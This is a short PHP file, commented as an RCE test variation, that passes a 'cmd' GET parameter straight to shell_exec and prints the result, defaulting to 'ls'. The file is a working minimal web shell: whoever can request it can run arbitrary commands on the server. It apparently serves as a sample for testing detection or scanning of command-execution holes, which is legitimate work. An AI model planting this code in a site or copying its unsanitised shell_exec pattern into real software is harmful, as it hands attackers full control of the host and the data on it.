<?php
// RCE test variation #1313
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>